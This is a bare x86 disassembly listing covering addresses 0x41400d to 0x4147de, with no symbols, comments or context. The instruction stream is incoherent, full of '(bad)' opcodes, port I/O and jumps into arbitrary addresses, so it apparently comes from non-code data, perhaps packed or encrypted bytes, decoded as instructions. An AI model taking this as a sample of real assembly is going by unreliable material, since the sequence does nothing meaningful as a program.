  41400d:	cmp    bl,dh
  41400f:	jno    0x413fc4
  414011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414012:	pop    ss
  414013:	push   esi
  414014:	mov    al,ds:0x7fa0648c
  414019:	popf   
  41401a:	and    BYTE PTR [ebx-0x791bc5c4],cl
  414020:	test   eax,0x7c0adf83
  414025:	inc    ecx
  414026:	and    eax,0x19670fe4
  41402b:	mov    ds:0x65926fb9,eax
  414030:	(bad)
  414033:	mov    dh,0x3
  414035:	xor    ebx,ebx
  414037:	xchg   esi,eax
  414038:	inc    edx
  414039:	aas    
  41403a:	mov    BYTE PTR [ecx+0x5d],cl
  41403d:	jp     0x414068
  41403f:	jecxz  0x414006
  414041:	jnp    0x414044
  414043:	gs mov esp,0xdbd35a61
  414049:	dec    ebx
  41404a:	rcl    DWORD PTR [ebp+0x61],cl
  41404d:	call   0xa0d21511
  414052:	mov    dh,0x65
  414054:	ins    BYTE PTR es:[edi],dx
  414055:	mov    esp,0x3d6b6d2d
  41405a:	mov    al,0x9d
  41405c:	mov    esp,eax
  41405e:	aas    
  41405f:	aad    0xe1
  414061:	add    bh,ch
  414063:	inc    ax
  414065:	aam    0xfd
  414067:	and    BYTE PTR [edi],cl
  414069:	cdq    
  41406a:	shr    DWORD PTR [esi],1
  41406c:	xor    eax,DWORD PTR [esi]
  41406e:	fs xchg edx,eax
  414070:	pop    es
  414071:	scas   al,BYTE PTR es:[edi]
  414072:	xchg   esi,eax
  414073:	lods   eax,DWORD PTR ds:[esi]
  414074:	cld    
  414075:	add    al,0x11
  414077:	in     eax,dx
  414078:	cmp    eax,0x74f3b4b9
  41407d:	mov    dl,0xbd
  41407f:	cdq    
  414080:	outs   dx,DWORD PTR ds:[esi]
  414081:	gs jg  0x41406c
  414084:	push   0xffffff91
  414086:	cdq    
  414087:	fsub   st,st(1)
  414089:	fmul   QWORD PTR [edx+ebx*2-0xd7c106d]
  414090:	in     eax,dx
  414091:	mov    edi,DWORD PTR [ebx-0x7db66f95]
  414097:	ret    
  414098:	xor    al,0x29
  41409a:	dec    ecx
  41409b:	push   0x396539be
  4140a0:	add    esi,ebp
  4140a2:	sbb    esi,edi
  4140a4:	cmp    esi,DWORD PTR [eax-0x43]
  4140a7:	push   ebx
  4140a8:	idiv   al
  4140aa:	jne    0x4140b3
  4140ac:	adc    al,BYTE PTR [edi]
  4140ae:	leave  
  4140af:	call   0x595b:0xa5a85266
  4140b6:	imul   esi,esi,0xb4c04112
  4140bc:	mov    ds:0x50bc1d61,al
  4140c1:	inc    ebp
  4140c2:	and    eax,edi
  4140c4:	es push esi
  4140c6:	cld    
  4140c7:	dec    ebp
  4140c8:	aas    
  4140c9:	sbb    BYTE PTR fs:[edx+ebx*2],bh
  4140cd:	daa    
  4140ce:	out    dx,eax
  4140cf:	das    
  4140d0:	pop    edx
  4140d1:	pushf  
  4140d2:	ds ins DWORD PTR es:[edi],dx
  4140d4:	fisttp WORD PTR [esi-0x71fd901b]
  4140da:	cmp    DWORD PTR [ebx-0x7988f240],esi
  4140e0:	push   edi
  4140e1:	push   edx
  4140e2:	iret   
  4140e3:	pop    ss
  4140e4:	enter  0xf294,0xf4
  4140e8:	stc    
  4140e9:	cmc    
  4140ea:	or     edi,DWORD PTR [esi+0x7a]
  4140ed:	cmp    ebp,ebx
  4140ef:	shl    ah,0xd8
  4140f2:	push   esp
  4140f3:	dec    ebp
  4140f4:	sub    ebx,DWORD PTR [ebx+0x3e582fbf]
  4140fa:	stc    
  4140fb:	pop    es
  4140fc:	jo     0x4140d9
  4140fe:	jmp    0x4140ef
  414100:	popa   
  414101:	lods   eax,DWORD PTR ds:[esi]
  414102:	hlt    
  414103:	sub    BYTE PTR [edx-0x5535c52],dh
  414109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41410a:	mov    esi,0x5188d34e
  41410f:	xchg   ebx,eax
  414110:	sub    DWORD PTR [esp+eiz*8+0x69],edx
  414114:	ret    
  414115:	jo     0x4140a3
  414117:	push   0x77
  414119:	mov    ds:0xf49a660d,al
  41411e:	mov    esi,0x136a2c7c
  414123:	cdq    
  414124:	je     0x4140bf
  414126:	cmp    ah,ah
  414128:	and    bl,BYTE PTR [edi-0x79]
  41412b:	loope  0x41416d
  41412d:	jecxz  0x4140d8
  41412f:	adc    eax,0xc38ca805
  414134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414135:	xchg   ebp,eax
  414136:	xor    al,0xfc
  414138:	mov    ah,0x31
  41413a:	fcomip st,st(3)
  41413c:	cs jno 0x41410d
  41413f:	cmp    BYTE PTR ds:0x6597834,dl
  414145:	sub    DWORD PTR [ecx+0x4],edi
  414148:	(bad)  
  414149:	arpl   cx,bx
  41414b:	fist   WORD PTR [eax+0xd3347a8]
  414151:	xchg   esp,eax
  414152:	mov    edx,DWORD PTR [ebx-0x4177c986]
  414158:	xor    BYTE PTR [eax+0x37],ah
  41415b:	inc    ecx
  41415c:	imul   ecx,DWORD PTR [esi],0x3a
  41415f:	sbb    ah,0x7e
  414162:	loopne 0x414114
  414164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414165:	dec    esi
  414166:	ficomp DWORD PTR [edx+eax*4+0x3b4d6afd]
  41416d:	ret    0x6ffb
  414170:	xchg   edi,eax
  414171:	mov    al,ds:0xebff2185
  414176:	xor    esp,DWORD PTR [edx+edi*2]
  414179:	out    0x61,al
  41417b:	dec    eax
  41417c:	into   
  41417d:	mov    WORD PTR [edi+0x50575549],ds
  414183:	ja     0x414199
  414185:	push   ebx
  414186:	rcl    DWORD PTR [edx-0x3f],cl
  414189:	out    0xe1,al
  41418b:	in     al,dx
  41418c:	mov    ebp,0x6510566e
  414191:	inc    ecx
  414192:	cli    
  414193:	mov    eax,ds:0x9388060a
  414198:	add    bl,BYTE PTR [edx+ecx*1-0xb9bf827]
  41419f:	cwde   
  4141a0:	adc    DWORD PTR [ebp+0x1ca148d0],ecx
  4141a6:	cmp    bl,bl
  4141a8:	mov    dl,0xfd
  4141aa:	fs pop ds
  4141ac:	adc    BYTE PTR [ebp-0x74],al
  4141af:	mov    al,ds:0x51abfa43
  4141b4:	jle    0x41422b
  4141b6:	push   esp
  4141b7:	aam    0xa3
  4141b9:	ret    
  4141ba:	es jo  0x414191
  4141bd:	xor    eax,0x4a69dbba
  4141c2:	loop   0x414176
  4141c4:	and    BYTE PTR [ebx],ah
  4141c6:	shr    ecx,1
  4141c8:	dec    esp
  4141c9:	(bad)  
  4141ca:	std    
  4141cb:	inc    esi
  4141cc:	jne    0x4141ec
  4141ce:	mov    ds:0x2aa51656,al
  4141d3:	pop    eax
  4141d4:	push   edi
  4141d5:	imul   eax,DWORD PTR [edi-0x314db681],0x34e4e7fc
  4141df:	adc    BYTE PTR [edi+0x2bb1c73b],ch
  4141e5:	xchg   edx,eax
  4141e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141e7:	retf   0x110f
  4141ea:	(bad)  
  4141eb:	retf   
  4141ec:	sbb    esi,DWORD PTR [ecx]
  4141ee:	dec    ecx
  4141ef:	cld    
  4141f0:	mov    dl,0x75
  4141f2:	aaa    
  4141f3:	inc    ebp
  4141f4:	mov    edx,0xa50c8ac3
  4141f9:	jb     0x414208
  4141fb:	int3   
  4141fc:	fst    QWORD PTR [ecx+0x6b]
  4141ff:	aas    
  414200:	ins    BYTE PTR es:[edi],dx
  414201:	ficomp WORD PTR [ecx]
  414203:	cmp    bl,BYTE PTR [eax+0x73a8316d]
  414209:	mov    al,0x39
  41420b:	and    BYTE PTR [edx+0x5d8a7eb3],dh
  414211:	sahf   
  414212:	cmp    esi,DWORD PTR [esi-0x7b]
  414215:	mov    ch,0x26
  414217:	inc    eax
  414218:	iret   
  414219:	int3   
  41421a:	aas    
  41421b:	xor    ch,BYTE PTR [edx-0x2af77aad]
  414221:	add    BYTE PTR [ebx-0x1e],al
  414224:	add    DWORD PTR [esi+0x277800b6],edx
  41422a:	repz fisub DWORD PTR [ebp-0x337ec120]
  414231:	jno    0x414256
  414233:	adc    eax,0xe2599359
  414238:	adc    al,0xa3
  41423a:	and    al,0x99
  41423c:	jle    0x4142a3
  41423e:	int3   
  41423f:	hlt    
  414240:	sbb    eax,0xf58e6e0e
  414245:	pop    edx
  414246:	pop    ecx
  414247:	scas   eax,DWORD PTR es:[edi]
  414248:	test   DWORD PTR [edx],ebx
  41424a:	push   es
  41424b:	ret    0xe15e
  41424e:	jg     0x4141d6
  414250:	int    0x1d
  414252:	cmp    dl,BYTE PTR [ebx-0x2e]
  414255:	(bad)  
  414256:	out    dx,eax
  414257:	sub    eax,0xde183fbb
  41425c:	mov    al,0x1
  41425e:	xor    al,0x0
  414260:	lahf   
  414261:	(bad)  
  414262:	pusha  
  414263:	dec    ebx
  414264:	cmp    al,0x9c
  414266:	sahf   
  414267:	sub    DWORD PTR [ecx+0x38640c3],eax
  41426d:	sub    DWORD PTR [eax],esi
  41426f:	call   0xcb33a85
  414274:	pop    eax
  414275:	test   BYTE PTR [ebx+0x48],0xef
  414279:	aad    0x39
  41427b:	and    DWORD PTR [esi+0x13],0xffffffce
  41427f:	and    edx,DWORD PTR [eax-0x4b]
  414282:	cld    
  414283:	and    eax,0xa1871c2b
  414288:	push   0x3b
  41428a:	mov    bl,0x53
  41428c:	cmc    
  41428d:	pop    ebp
  41428e:	ret    0x13ae
  414291:	sbb    BYTE PTR [edx],ah
  414293:	div    DWORD PTR [edx+0x39342784]
  414299:	push   0x5b
  41429b:	mov    eax,?
  41429d:	jmp    0xc71df2d4
  4142a2:	xlat   BYTE PTR ds:[ebx]
  4142a3:	cmp    esi,eax
  4142a5:	lahf   
  4142a6:	leave  
  4142a7:	fmul   QWORD PTR ds:0x86d27d4c
  4142ad:	mov    ds:0xaa660807,eax
  4142b2:	mov    ecx,0x83d98448
  4142b7:	jp     0x41429c
  4142b9:	jle    0x41431a
  4142bb:	push   ebx
  4142bc:	mov    ds:0x6dd99529,eax
  4142c1:	icebp  
  4142c2:	outs   dx,BYTE PTR ds:[esi]
  4142c3:	shl    BYTE PTR [eax],1
  4142c5:	add    DWORD PTR [esi+0x51facfba],0xffffffac
  4142cc:	retf   
  4142cd:	cmp    dl,BYTE PTR [ebx]
  4142cf:	jne    0x414344
  4142d1:	jg     0x41434f
  4142d3:	mov    ebx,0xecea105d
  4142d8:	mov    ch,0xcd
  4142da:	mov    dl,0xf4
  4142dc:	add    DWORD PTR ds:0xfbf5b449,ebp
  4142e2:	xor    eax,0x5026f330
  4142e7:	popa   
  4142e8:	jmp    0x4142c7
  4142ea:	repz mov eax,ds:0x56947f6e
  4142f0:	not    edi
  4142f2:	cld    
  4142f3:	test   BYTE PTR [esi],0x1a
  4142f6:	test   DWORD PTR [edi-0x2d],ebx
  4142f9:	sahf   
  4142fa:	dec    ebx
  4142fb:	lahf   
  4142fc:	outs   dx,BYTE PTR ds:[esi]
  4142fd:	outs   dx,BYTE PTR ds:[esi]
  4142fe:	test   DWORD PTR [eax+0x2c],edi
  414301:	or     al,0x91
  414303:	jecxz  0x4142db
  414305:	ins    DWORD PTR es:[edi],dx
  414306:	test   ebx,0x47954868
  41430c:	and    BYTE PTR es:[edi-0x29],cl
  414310:	or     dh,al
  414312:	inc    edi
  414313:	dec    edi
  414314:	sbb    eax,0x52d73087
  414319:	add    al,0x0
  41431b:	inc    ecx
  41431c:	xchg   BYTE PTR [ebx],dh
  41431e:	push   esp
  41431f:	mov    ecx,0x9fa05dd0
  414324:	sub    BYTE PTR [edx-0x6af9b35b],ch
  41432a:	jo     0x414306
  41432c:	bound  ecx,QWORD PTR [ebx+0x2646912c]
  414332:	mov    ah,0x3a
  414334:	out    0xd2,al
  414336:	outs   dx,BYTE PTR ds:[esi]
  414337:	mov    DWORD PTR [ecx+0xf82a39d],esi
  41433d:	pop    ds
  41433e:	fwait
  41433f:	aaa    
  414340:	outs   dx,DWORD PTR ds:[esi]
  414341:	mov    bl,0x61
  414343:	push   cs
  414344:	cdq    
  414345:	dec    esp
  414346:	inc    ebp
  414347:	dec    ebp
  414348:	fnstenv [edi]
  41434a:	int    0x4
  41434c:	ja     0x4143b9
  41434e:	cmp    BYTE PTR [esi-0x10410be2],0x64
  414355:	mov    ecx,esp
  414357:	mov    esp,0xd9055a3
  41435c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41435d:	push   esi
  41435e:	jnp    0x4143c3
  414360:	and    edi,edi
  414362:	ins    DWORD PTR es:[edi],dx
  414363:	dec    ebp
  414364:	mov    al,ds:0x6aecd075
  414369:	push   es
  41436a:	in     eax,0x99
  41436c:	push   ebp
  41436d:	sub    al,0xd9
  41436f:	jns    0x414372
  414371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414372:	and    esi,DWORD PTR [eax]
  414374:	push   esp
  414375:	nop
  414376:	mov    dh,0x73
  414378:	add    bh,dl
  41437a:	pop    edi
  41437b:	sti    
  41437c:	push   ebp
  41437d:	push   esp
  41437e:	adc    al,0x0
  414380:	in     eax,dx
  414381:	scas   eax,DWORD PTR es:[edi]
  414382:	clc    
  414383:	mov    edx,0x4c56ece4
  414388:	xchg   esi,eax
  414389:	aas    
  41438a:	adc    DWORD PTR [ecx],esi
  41438c:	add    DWORD PTR [ecx],ebp
  41438e:	push   es
  41438f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414390:	sub    ecx,0xffffffd3
  414393:	xor    BYTE PTR [ebx+0x35fbdd5a],0xb8
  41439a:	ja     0x414377
  41439c:	mov    edx,0x9ccb7014
  4143a1:	and    DWORD PTR [edx-0x61],0x25ddabf2
  4143a8:	out    dx,al
  4143a9:	leave  
  4143aa:	std    
  4143ab:	cs scas al,BYTE PTR es:[edi]
  4143ad:	cwde   
  4143ae:	std    
  4143af:	outs   dx,DWORD PTR es:[esi]
  4143b1:	cmp    ch,bh
  4143b3:	sar    BYTE PTR [ecx],cl
  4143b5:	lods   eax,DWORD PTR ds:[esi]
  4143b6:	sub    al,0xc1
  4143b8:	test   al,0x80
  4143ba:	jg     0x4143f8
  4143bc:	fwait
  4143bd:	addr16 call 0x48a2:0x2dab13f
  4143c5:	mov    ds:0x1a5c990e,eax
  4143ca:	mov    edi,0x763d1437
  4143cf:	es iret 
  4143d1:	cli    
  4143d2:	cmp    eax,0xcd55f682
  4143d7:	xor    al,0x53
  4143d9:	in     eax,0xad
  4143db:	inc    ebp
  4143dc:	adc    bl,bh
  4143de:	aas    
  4143df:	sub    BYTE PTR [edx+0x6b],bh
  4143e2:	jnp    0x4143a2
  4143e4:	xchg   DWORD PTR [edx],ebx
  4143e6:	pushf  
  4143e7:	mov    dh,0xe5
  4143e9:	xor    dh,BYTE PTR [eax+0x54a5cb50]
  4143ef:	repnz sbb al,0x47
  4143f2:	out    dx,eax
  4143f3:	pushf  
  4143f4:	and    BYTE PTR [eax],ch
  4143f6:	adc    al,0x83
  4143f8:	pop    ecx
  4143f9:	jno    0x41437f
  4143fb:	call   0x154a:0xf571feb1
  414402:	popw   ds
  414404:	inc    ebp
  414405:	rcr    BYTE PTR [esi],cl
  414407:	outs   dx,DWORD PTR ds:[esi]
  414408:	stos   DWORD PTR es:[edi],eax
  414409:	in     al,0xb4
  41440b:	mov    esi,0x4aa426ee
  414410:	jle    0x414461
  414412:	retf   0x9df0
  414415:	or     BYTE PTR [ecx+eax*2-0x6e],bh
  414419:	sub    DWORD PTR [ebx+0x60],esi
  41441c:	mov    al,0x4d
  41441e:	test   DWORD PTR [edx-0x22fa8674],ebx
  414424:	outs   dx,DWORD PTR gs:[esi]
  414426:	pop    es
  414427:	(bad)  
  414428:	call   0x71e47b48
  41442d:	mov    eax,ds:0x8cc7eb12
  414432:	outs   dx,BYTE PTR ds:[esi]
  414433:	in     al,dx
  414434:	sti    
  414435:	jl     0xde33902c
  41443b:	jno    0x414478
  41443d:	jmp    0x47b1654
  414442:	adc    ecx,DWORD PTR [ecx]
  414444:	xchg   edx,eax
  414445:	into   
  414446:	and    eax,0xd393c360
  41444b:	cmp    eax,0xe0db2477
  414450:	test   ebp,edx
  414452:	jp     0x4143e0
  414454:	push   esp
  414455:	add    edi,DWORD PTR [esp+ebp*2+0x33b532eb]
  41445c:	pop    ebp
  41445d:	hlt    
  41445e:	push   ss
  41445f:	fcomi  st,st(2)
  414461:	xchg   DWORD PTR [ecx+ecx*2-0x43],eax
  414465:	and    dl,BYTE PTR [edi]
  414467:	out    0xe6,eax
  414469:	clc    
  41446a:	and    edx,DWORD PTR [edi+0x720df26d]
  414470:	cmc    
  414471:	mov    dl,0x4a
  414473:	sbb    ah,BYTE PTR [esi-0x36fde005]
  414479:	push   eax
  41447a:	sbb    BYTE PTR ds:0x4d9ad7f8,dh
  414480:	iret   
  414481:	xor    DWORD PTR [esi],ebx
  414483:	or     DWORD PTR [eax+0x68],edx
  414486:	shr    DWORD PTR [edx-0x76b3b141],0xe6
  41448d:	adc    al,0x7
  41448f:	outs   dx,DWORD PTR ds:[esi]
  414490:	ins    DWORD PTR es:[edi],dx
  414491:	xchg   edx,eax
  414492:	aam    0x61
  414494:	xlat   BYTE PTR ds:[ebx]
  414495:	(bad)  
  414496:	xchg   edi,eax
  414497:	in     al,dx
  414498:	lods   al,BYTE PTR ds:[esi]
  414499:	(bad)  
  41449a:	mov    al,0x9
  41449c:	jnp    0x41451b
  41449e:	adc    al,0x14
  4144a0:	and    bl,bl
  4144a2:	sbb    DWORD PTR [ecx],esi
  4144a4:	pushf  
  4144a5:	ror    DWORD PTR [edi],0xe3
  4144a8:	push   esp
  4144a9:	push   cs
  4144aa:	jecxz  0x414498
  4144ac:	out    dx,al
  4144ad:	jl     0x4144c6
  4144af:	add    bl,BYTE PTR [ebx+0x8]
  4144b2:	xchg   ebp,eax
  4144b3:	mov    ch,0xa4
  4144b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144b6:	inc    ebp
  4144b7:	push   ecx
  4144b8:	jge    0x4144a1
  4144ba:	or     al,0x41
  4144bc:	fistp  QWORD PTR [edi+0x44]
  4144bf:	jl     0x4144e9
  4144c1:	jb     0x4144d5
  4144c3:	fadd   st(3),st
  4144c5:	(bad)  
  4144c7:	pusha  
  4144c8:	inc    ebx
  4144c9:	enter  0x90eb,0x1e
  4144cd:	push   eax
  4144ce:	mov    ah,BYTE PTR [esi+eax*4-0x21]
  4144d2:	das    
  4144d3:	scas   al,BYTE PTR es:[edi]
  4144d4:	push   es
  4144d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144d6:	pop    es
  4144d7:	iret   
  4144d8:	add    al,0xc
  4144da:	mov    ds:0x4ce73cc5,eax
  4144df:	push   edi
  4144e0:	enter  0x7902,0xf8
  4144e4:	xchg   esi,eax
  4144e5:	test   al,0x38
  4144e7:	cs test bh,ah
  4144ea:	sti    
  4144eb:	push   ecx
  4144ec:	push   edi
  4144ed:	mov    BYTE PTR [esi],bl
  4144ef:	adc    DWORD PTR [esi],0x4
  4144f2:	gs jnp 0x41449e
  4144f5:	pop    edi
  4144f6:	call   0x3fe44249
  4144fb:	in     eax,0xe4
  4144fd:	mov    ebx,0x1d791408
  414502:	(bad)
  414505:	inc    ecx
  414506:	jno    0x4144be
  414508:	loope  0x4144b6
  41450a:	adc    ecx,DWORD PTR [eax-0x56]
  41450d:	and    al,bl
  41450f:	push   0x4ba0009c
  414514:	add    esi,ebx
  414516:	sub    al,0x77
  414518:	call   0x4f173630
  41451d:	call   FWORD PTR [ecx-0x59bc1bcc]
  414523:	push   ds
  414524:	xor    DWORD PTR [edi+0x2a],ecx
  414527:	push   es
  414528:	dec    ebx
  414529:	(bad)  
  41452b:	fwait
  41452c:	out    dx,al
  41452d:	test   dh,0xc9
  414530:	jle    0x4144fc
  414532:	dec    edi
  414533:	xchg   esp,eax
  414534:	aas    
  414535:	retf   0x1f35
  414538:	jns    0x414541
  41453a:	imul   esp,DWORD PTR [esi],0xda891713
  414540:	out    0xf2,al
  414542:	mov    dh,0x9a
  414544:	adc    eax,DWORD PTR [esi+0x2c00ca38]
  41454a:	mov    eax,ds:0x4d7235d0
  41454f:	xor    ecx,DWORD PTR [edx]
  414551:	lahf   
  414552:	xor    BYTE PTR [esi-0x6644dcb6],al
  414558:	mov    dl,0x5f
  41455a:	cmp    BYTE PTR [ebp+0x58],bl
  41455d:	mov    ebp,0x703a3028
  414562:	call   0xe9bd:0x5c2ef845
  414569:	add    BYTE PTR [edx],dh
  41456b:	call   0x938a:0x7cecd6a1
  414572:	fdivr  QWORD PTR [ebp-0x79daaba2]
  414578:	mov    eax,0x17b3c5e3
  41457d:	pusha  
  41457e:	add    bh,dl
  414580:	inc    ebx
  414581:	pop    esi
  414582:	cwde   
  414583:	je     0x41457e
  414585:	xchg   DWORD PTR [esi-0x551070f5],ebx
  41458b:	mov    ch,BYTE PTR [esi]
  41458d:	pop    esp
  41458e:	ja     0x414569
  414590:	push   cs
  414591:	push   0x39
  414593:	pop    esi
  414594:	stc    
  414595:	sti    
  414596:	fstp   QWORD PTR [edx-0x7af52270]
  41459c:	sahf   
  41459d:	mov    esi,0xe6171f65
  4145a2:	jne    0x4145e8
  4145a4:	fcmove st,st(7)
  4145a6:	lods   al,BYTE PTR ds:[esi]
  4145a7:	mov    ebp,0xa7f55dd8
  4145ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ad:	test   al,0x2e
  4145af:	(bad)  
  4145b0:	sbb    ch,BYTE PTR [edx+0x45]
  4145b3:	mov    ebx,0xce86e506
  4145b8:	jp     0x41459f
  4145ba:	(bad)  
  4145bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145bc:	(bad)  
  4145bd:	fisttp WORD PTR [edi]
  4145bf:	dec    eax
  4145c0:	in     al,0x71
  4145c2:	fs (bad) 
  4145c4:	pop    edx
  4145c5:	push   esi
  4145c6:	fbld   TBYTE PTR [eax+0x7e]
  4145c9:	fistp  QWORD PTR [ebx]
  4145cb:	xor    al,0xe9
  4145cd:	sti    
  4145ce:	and    al,0x51
  4145d0:	dec    ebx
  4145d1:	call   0x6cfe214e
  4145d6:	sbb    ah,cl
  4145d8:	mov    dl,dl
  4145da:	out    0x72,eax
  4145dc:	call   0xb58:0xd5bb8268
  4145e3:	mov    dh,0x63
  4145e5:	mov    BYTE PTR [ebx],cl
  4145e7:	dec    edi
  4145e8:	fsub   QWORD PTR [ebx+0x10]
  4145eb:	inc    ebx
  4145ec:	hlt    
  4145ed:	in     al,0xd5
  4145ef:	dec    ebp
  4145f0:	mov    ah,0x67
  4145f2:	je     0x414608
  4145f4:	pop    ebp
  4145f5:	fcom   QWORD PTR [eax-0x70]
  4145f8:	fmul   st(5),st
  4145fa:	pushf  
  4145fb:	ror    BYTE PTR [ebx+0x73671474],0x27
  414602:	mov    edx,0x2920d99a
  414607:	bound  edx,QWORD PTR [ebx]
  414609:	repz fistp WORD PTR [ebp-0x9]
  41460d:	mov    al,0x59
  41460f:	icebp  
  414610:	xor    al,0x54
  414612:	xchg   edx,eax
  414613:	sub    BYTE PTR [ebp-0x6551640d],0x57
  41461a:	mov    WORD PTR [ebx+eiz*8-0x5b3e009],cs
  414621:	lahf   
  414622:	cwde   
  414623:	mov    al,ds:0x4a8eac32
  414628:	pop    esi
  414629:	fistp  DWORD PTR [ebx+0xf]
  41462c:	pop    ecx
  41462d:	pushf  
  41462e:	cmp    DWORD PTR [esi+0x5648094a],0xbc16adb5
  414638:	sub    al,0x93
  41463a:	stc    
  41463b:	or     eax,0xc60a10b5
  414640:	rcr    DWORD PTR [eax],1
  414642:	push   es
  414643:	sbb    edi,DWORD PTR [eax-0x29]
  414646:	jp     0x41463a
  414648:	(bad)  
  414649:	std    
  41464a:	push   esp
  41464b:	outs   dx,BYTE PTR ds:[esi]
  41464c:	pop    edx
  41464d:	arpl   WORD PTR [eax],bx
  41464f:	dec    ebx
  414650:	shl    BYTE PTR [edi-0x17a3e3b7],1
  414656:	out    0xc2,al
  414658:	ret    
  414659:	push   0x1e035d47
  41465e:	fcomp  QWORD PTR [ecx-0x39]
  414661:	xor    eax,0x9722a3bd
  414666:	stos   BYTE PTR es:[edi],al
  414667:	bound  esp,QWORD PTR [ebp+0x1814460c]
  41466d:	adc    dh,BYTE PTR [edi+0x37]
  414670:	mul    ecx
  414672:	dec    ecx
  414673:	dec    esp
  414674:	es popa 
  414676:	push   ss
  414677:	hlt    
  414678:	pop    es
  414679:	inc    edx
  41467a:	add    eax,0x4cddfa6f
  41467f:	push   cs
  414680:	and    bl,BYTE PTR [edi-0x74]
  414683:	in     eax,0x43
  414685:	and    ch,BYTE PTR [esi]
  414687:	aaa    
  414688:	jle    0x414631
  41468a:	pop    esi
  41468b:	shl    BYTE PTR [ebx+0x49d78853],cl
  414691:	mov    edi,0xf086742f
  414696:	retf   
  414697:	iret   
  414698:	mov    WORD PTR [ebx-0x46fe534a],gs
  41469e:	xor    eax,0xac699917
  4146a3:	dec    edi
  4146a4:	ficom  WORD PTR cs:[ebx]
  4146a7:	std    
  4146a8:	mov    bh,0x8b
  4146aa:	stc    
  4146ab:	pop    DWORD PTR [esi+ebp*4-0x33d01a56]
  4146b2:	mov    ecx,0xf9a6cb0e
  4146b7:	pop    ds
  4146b8:	rcr    BYTE PTR [ebp-0x6aeb9b90],1
  4146be:	pop    ebp
  4146bf:	aaa    
  4146c0:	mov    BYTE PTR [eax+0x69],dh
  4146c3:	xor    bh,BYTE PTR [eax-0x1d4a64f1]
  4146c9:	jle    0x414658
  4146cb:	xor    edx,0xffffffe9
  4146ce:	int3   
  4146cf:	cmp    al,0x6e
  4146d1:	sahf   
  4146d2:	stos   DWORD PTR es:[edi],eax
  4146d3:	xchg   BYTE PTR [edx-0x67901b99],al
  4146d9:	pop    ds
  4146da:	dec    esi
  4146db:	push   ecx
  4146dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146dd:	jp     0x414678
  4146df:	mov    ebp,0x1b9e3667
  4146e4:	inc    esp
  4146e5:	dec    esi
  4146e6:	dec    esi
  4146e7:	in     al,0xfd
  4146e9:	xchg   DWORD PTR [edx+edx*2+0x7b65a77],esi
  4146f0:	mov    esp,0xf2ca782d
  4146f5:	mov    esp,0x7ed1496e
  4146fa:	out    dx,eax
  4146fb:	push   eax
  4146fc:	popa   
  4146fd:	pop    ebx
  4146fe:	loop   0x4146cf
  414700:	add    ebx,ecx
  414702:	stos   DWORD PTR es:[edi],eax
  414703:	ds push edi
  414705:	ret    
  414706:	daa    
  414707:	jmp    edx
  414709:	imul   edi,DWORD PTR [edx],0x3e
  41470c:	int3   
  41470d:	lahf   
  41470e:	mov    eax,ds:0x23cea2bd
  414713:	adc    BYTE PTR ds:0x3f300109,bl
  414719:	outs   dx,DWORD PTR ds:[esi]
  41471a:	bound  edi,QWORD PTR [edx]
  41471c:	xor    ebx,ebx
  41471e:	lahf   
  41471f:	dec    edi
  414720:	xchg   ebp,eax
  414721:	lods   al,BYTE PTR ds:[esi]
  414722:	in     al,dx
  414723:	push   cs
  414724:	neg    DWORD PTR [ecx+0x0]
  414727:	mov    ah,0x4c
  414729:	or     dh,BYTE PTR [ecx+edi*4-0x50]
  41472d:	mov    bl,0xba
  41472f:	sub    bh,BYTE PTR [edx+edx*4]
  414732:	add    BYTE PTR [edi+ebp*8-0x563e2c30],ah
  414739:	pop    ds
  41473a:	and    BYTE PTR [ebp-0x432fc383],0xad
  414741:	push   0x169b9a1
  414746:	pop    esp
  414747:	fmul   QWORD PTR [esi+0xcecd245]
  41474d:	xor    bl,BYTE PTR [ecx]
  41474f:	lods   al,BYTE PTR ds:[esi]
  414750:	ror    BYTE PTR [ecx-0x33d999e1],1
  414756:	pop    ebx
  414757:	mov    ah,0x8a
  414759:	mov    ebx,DWORD PTR [eax+0x39]
  41475c:	lock cmp al,0x38
  41475f:	shl    BYTE PTR [ebp+0x67],cl
  414762:	xor    DWORD PTR [ebx+edx*4-0x2e],ebx
  414766:	in     al,dx
  414767:	dec    edx
  414768:	retf   
  414769:	fwait
  41476a:	in     eax,dx
  41476b:	inc    ebp
  41476c:	xchg   ecx,eax
  41476d:	and    eax,0xd789fb18
  414772:	push   ebx
  414773:	sbb    edx,ebp
  414775:	xchg   ecx,eax
  414776:	push   edx
  414777:	add    BYTE PTR [ecx-0x43],dl
  41477a:	mov    cl,0xd7
  41477c:	sub    DWORD PTR [esi-0x67],eax
  41477f:	scas   eax,DWORD PTR es:[edi]
  414780:	out    dx,eax
  414781:	mov    esp,0xb987c541
  414786:	mov    BYTE PTR [edx],ch
  414788:	dec    esi
  414789:	lea    edi,[edi-0xf]
  41478c:	jnp    0x414713
  41478e:	addr16 adc eax,0x91bfd70b
  414794:	add    bh,BYTE PTR [esi-0x52a78be6]
  41479a:	push   ebx
  41479b:	inc    ecx
  41479c:	add    DWORD PTR [ecx-0x9c4c40d],ebp
  4147a2:	or     eax,0x9fb86fb4
  4147a7:	push   ds
  4147a8:	std    
  4147a9:	test   al,0x87
  4147ab:	ja     0x414792
  4147ad:	sbb    bh,BYTE PTR [esi+0x7b4d557]
  4147b3:	or     al,0xfb
  4147b5:	call   0xfebd:0x142810eb
  4147bc:	nop
  4147bd:	ret    0x6d6
  4147c0:	pop    ecx
  4147c1:	jmp    0xd82b9286
  4147c6:	add    al,0xf4
  4147c8:	mov    ds:0x84fee696,eax
  4147cd:	inc    ebx
  4147ce:	cld    
  4147cf:	cmp    BYTE PTR [edx],bh
  4147d1:	shr    BYTE PTR [eax-0x2f],0x2c
  4147d5:	adc    dh,BYTE PTR [edx+esi*1-0x7b501590]
  4147dc:	push   ebx
  4147dd:	sti    
  4147de:	pop    esi
